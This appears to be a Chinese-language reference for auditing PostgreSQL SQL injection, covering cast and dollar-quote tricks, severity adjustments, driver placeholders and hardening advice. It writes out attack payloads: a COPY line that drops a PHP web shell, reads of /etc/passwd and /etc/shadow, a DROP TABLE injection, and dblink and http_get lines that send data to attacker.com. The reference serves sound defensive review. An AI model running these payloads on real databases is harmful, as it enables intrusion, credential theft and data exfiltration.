# PostgreSQL — 引擎特异性知识

---

## 1. 注入特有技法

### 1.1 类型转换操作符 `::`

```sql
-- PostgreSQL 特有的类型转换语法，可被利用
SELECT * FROM users WHERE id = 1::int; -- 正常
-- 注入向量：通过 :: 后的类型名注入
-- 若应用拼接: WHERE data::${type} = '...'
-- 攻击者可设 type = "text; DROP TABLE users; --"
```

### 1.2 美元引号 `$$`

```sql
-- PostgreSQL 支持美元引号字符串，可绕过引号转义
SELECT $tag$这里的内容不需要转义单引号'$tag$;
-- 若 escape 函数只处理单引号，$$ 可绕过
```

### 1.3 `COPY` 命令读写文件

```sql
-- 若注入点可执行 stacked queries
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
COPY users TO '/tmp/dump.csv';
-- 需要 superuser 权限
```

### 1.4 `pg_read_file` / `pg_ls_dir` 文件读取

```sql
SELECT pg_read_file('/etc/passwd');           -- 需要 superuser
SELECT pg_ls_dir('/etc/');                    -- 列目录
SELECT pg_read_binary_file('/etc/shadow');    -- 二进制读取
```

### 1.5 大对象 (Large Objects) 攻击

```sql
SELECT lo_import('/etc/passwd');              -- 导入文件为大对象
SELECT lo_get(oid);                           -- 读取大对象内容
SELECT lo_export(oid, '/tmp/output');         -- 导出大对象到文件
```

### 1.6 `dblink` 扩展外联

```sql
-- 若安装了 dblink 扩展，可外联其他数据库
SELECT dblink_connect('host=attacker.com port=5432 dbname=exfil');
SELECT * FROM dblink('dbname=other', 'SELECT * FROM secrets') AS t(col text);
```

### 1.7 错误信息数据泄露

```sql
-- PostgreSQL 错误信息通常包含查询上下文
-- 基于错误的注入（Error-based）：
SELECT CAST(version() AS int);  -- 类型转换错误暴露版本信息
```

---

## 2. 严重性修正因子

| 条件 | 修正 | 原因 |
|------|------|------|
| 应用使用 `superuser` 连接 | ↑ 上调至 🔴 高危 | 可读写文件、创建函数 |
| `dblink` 扩展已安装 | ↑ 上调一级 | 数据外带到外部服务器 |
| 连接支持 stacked queries | ↑ 上调一级 | 可执行 COPY / CREATE FUNCTION |
| 使用 `pgcrypto` 等扩展 | 不变 | 但需评估扩展安全性 |
| 应用使用最低权限用户 | ↓ 下调一级 | COPY / pg_read_file 不可用 |

---

## 3. 占位符语法

| 驱动 | 占位符 | 示例 |
|------|--------|------|
| node-pg (pg) | `$1, $2, $3` | `WHERE id = $1 AND name = $2` |
| psycopg2 | `%s`（位置）/ `%(name)s`（命名） | `WHERE id = %s` |
| psycopg3 | `%s` / `%(name)s` / `$1` | 多种格式 |
| asyncpg | `$1, $2` | `WHERE id = $1` |
| pgx (Go) | `$1, $2` | `WHERE id = $1` |
| Npgsql (.NET) | `@name` / `$1` | `WHERE id = @id` |
| JDBC | `?` | `WHERE id = ?` |

---

## 4. 数据外带方法

| 方法 | 条件 | 示例 |
|------|------|------|
| 错误信息 | 默认可用 | `CAST(... AS int)` 触发错误暴露数据 |
| `COPY TO` 文件 | superuser | 写入可访问的文件路径 |
| `dblink` 外联 | 扩展已安装 | 连接攻击者控制的 PostgreSQL |
| DNS 外带 | `dblink` + DNS | `SELECT dblink('host='||data||'.attacker.com ...')` |
| HTTP 外带 | `pg_http` 扩展 | `SELECT http_get('http://attacker.com/?d='||data)` |
| 时间盲注 | 默认可用 | `pg_sleep(5)` |
| 布尔盲注 | 默认可用 | 条件差异 |

---

## 5. 防御建议

1. 使用最低权限数据库用户（非 superuser）
2. 禁用不必要的扩展（dblink, pg_http 等）
3. 配置 `pg_hba.conf` 限制连接来源
4. 驱动层默认禁用 stacked queries（node-pg 默认不支持，psycopg2 默认支持）
